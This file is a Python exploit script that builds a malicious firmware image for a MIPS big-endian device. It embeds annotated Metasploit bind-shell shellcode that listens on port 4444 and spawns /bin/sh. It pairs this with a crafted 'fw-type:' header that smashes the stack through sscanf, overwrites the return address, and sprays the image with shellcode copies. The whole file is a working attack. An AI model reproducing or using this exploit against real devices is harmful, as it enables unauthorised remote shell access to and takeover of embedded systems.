import sys
from struct import pack

# shellcode courtesy of metasploit mipsbe/shell_bind_tcp.rb
shellcode = pack(">58I", *[ \
                  # --- socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
    0x27bdffe0,   # addiu   sp,sp,-32
    0x240efffd,   # li      t6,-3
    0x01c02027,   # nor     a0,t6,zero
    0x01c02827,   # nor     a1,t6,zero
    0x2806ffff,   # slti    a2,zero,-1
    0x24021057,   # li      v0,4183 ( __NR_socket )
    0x0101010c,   # syscall
                  # --- bind(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
    0x3050ffff,   # andi    s0,v0,0xffff
    0x240effef,   # li      t6,-17                        ; t6: 0xffffffef
    0x01c07027,   # nor     t6,t6,zero                    ; t6: 0x10 (16)
    0x240dfffd,   # li      t5,-3                         ; t5: -3
    0x01a06827,   # nor     t5,t5,zero                    ; t5: 0x2
    0x01cd6804,   # sllv    t5,t5,t6                      ; t5: 0x00020000
    0x240e115c,   # li      t6,0x115c (port)              ; t6: 0x115c (4444 (default LPORT))
    0x01ae6825,   # or      t5,t5,t6                      ; t5: 0x0002115c
    0xafadffe0,   # sw      t5,-32(sp)
    0xafa0ffe4,   # sw      zero,-28(sp)
    0xafa0ffe8,   # sw      zero,-24(sp)
    0xafa0ffec,   # sw      zero,-20(sp)
    0x02102025,   # or      a0,s0,s0
    0x240effef,   # li      t6,-17
    0x01c03027,   # nor     a2,t6,zero
    0x23a5ffe0,   # addi    a1,sp,-32
    0x24021049,   # li      v0,4169 ( __NR_bind )A
    0x0101010c,   # syscall
                  # --- listen(3, 257) = 0
    0x02102025,   # or      a0,s0,s0
    0x24050101,   # li      a1,257
    0x2402104e,   # li      v0,4174 ( __NR_listen )
    0x0101010c,   # syscall
                  # --- accept(3, 0, NULL) = 4
    0x02102025,   # or      a0,s0,s0
    0x2805ffff,   # slti    a1,zero,-1
    0x2806ffff,   # slti    a2,zero,-1
    0x24021048,   # li      v0,4168 ( __NR_accept )
    0x0101010c,   # syscall
                  # --- dup2(4, 2) = 2
                  # --- dup2(4, 1) = 1
                  # --- dup2(4, 0) = 0
    0xafa2ffff,   # sw v0,-1(sp) # socket
    0x2411fffd,   # li s1,-3
    0x02208827,   # nor s1,s1,zero
    0x8fa4ffff,   # lw a0,-1(sp)
    0x02202821,   # move a1,s1 # dup2_loop
    0x24020fdf,   # li v0,4063 ( __NR_dup2 )
    0x0101010c,   # syscall 0x40404
    0x2410ffff,   # li s0,-1
    0x2231ffff,   # addi s1,s1,-1
    0x1630fffa,   # bne s1,s0 <dup2_loop>
                  # --- execve("//bin/sh", ["//bin/sh"], [/* 0 vars */]) = 0
    0x2806ffff,   # slti a2,zero,-1
    0x3c0f2f2f,   # lui t7,0x2f2f "//"
    0x35ef6269,   # ori t7,t7,0x6269 "bi"
    0xafafffec,   # sw t7,-20(sp)
    0x3c0e6e2f,   # lui t6,0x6e2f "n/"
    0x35ce7368,   # ori t6,t6,0x7368 "sh"
    0xafaefff0,   # sw t6,-16(sp)
    0xafa0fff4,   # sw zero,-12(sp)
    0x27a4ffec,   # addiu a0,sp,-20
    0xafa4fff8,   # sw a0,-8(sp)
    0xafa0fffc,   # sw zero,-4(sp)
    0x27a5fff8,   # addiu a1,sp,-8
    0x24020fab,   # li v0,4011 ( __NR_execve )
    0x0101010c    # syscall 0x40404
    ])

#pad to len 0x1000
shellcode += b"\x00"*(0x1000-len(shellcode))

crap = "JUST DOING SOME SSCANF STACK SMASHING NOTHING TO SEE HERE"

header  = pack('>I', 0x00FF0000)  # filesize
header += b'\xff'*16              # md5 (ignored)
header += b"fw-type:"             #
header += b'x'*4 + crap.encode()  # important stupid crap for posterity
header += b'x'*(256-len(crap)-4)  # fill stack $SP-0x108 to $SP-8
header += b"S8xx"                 # [$SP-8] = stored s8, ignore
header += pack('>I', 0x7701ff00)  # [$SP-4] = stored ra, point towards somewhere
                                  # in middle of ASLR'd mmap addresses
                                  # NOTE: 00 in address LSB stops scanf to leave
                                  # [$SP+0] (copy of arg0 *buffer) untouched

#pad to len 0x1000
header += b"\x00"*(0x1000-len(header))

fw = header
for i in range(0xff0000//0x1000-1):
    fw += shellcode

sys.stdout.buffer.write(fw)
